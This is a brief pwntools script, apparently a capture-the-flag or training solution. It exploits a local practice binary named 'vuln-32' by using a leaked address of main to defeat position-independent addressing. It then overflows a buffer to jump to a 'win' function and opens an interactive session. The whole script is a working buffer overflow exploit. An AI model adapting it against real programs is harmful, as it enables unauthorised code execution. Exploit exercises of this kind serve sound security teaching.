from pwn import *


elf = context.binary = ELF("./vuln-32")

p = process()
p.recvuntil(b": ")
main_offset = int(p.recvline().decode().strip()[2:],16)
elf.address =  main_offset - elf.sym["main"]


payload = flat([
    b"A" * 32,
    elf.sym["win"]
])

p.sendline(payload)

p.interactive()